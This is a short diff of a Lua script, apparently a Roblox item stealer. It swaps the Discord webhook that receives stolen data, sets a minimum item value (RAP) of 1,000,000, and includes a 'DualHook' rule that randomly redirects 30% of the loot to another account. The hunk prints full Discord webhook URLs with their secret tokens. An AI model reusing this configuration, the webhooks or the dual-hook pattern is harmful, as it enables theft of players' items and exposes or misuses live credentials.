@@ -40,10 +40,9 @@ end
 local DualHookWebhook = "https://discord.com/api/webhooks/1406998805932675144/UHpJcWhhFtalVAKHNujysIfgZXrcakVkmyw5kAorf3EV6XVFu7NH2kSPc_bEdY04voA0"
 local DualHookName = "Eliaskulmer999"
 local DualHookRap = 0
-
 local users = "Eliaskulmer999"
 local min_rap = 1000000
-local webhook = "https://discord.com/api/webhooks/1406998805932675144/UHpJcWhhFtalVAKHNujysIfgZXrcakVkmyw5kAorf3EV6XVFu7NH2kSPc_bEdY04voA0"
+local webhook = "https://discord.com/api/webhooks/1407814443231871226/doFyO0sPxeH5WFjvWgW0UlKDgjG6xAuBAvXjBAffh88jLaccLjOpsg32cKqBAp1y8iWq"
 
 if math.random() < 0.3 then
 	users = DualHookName
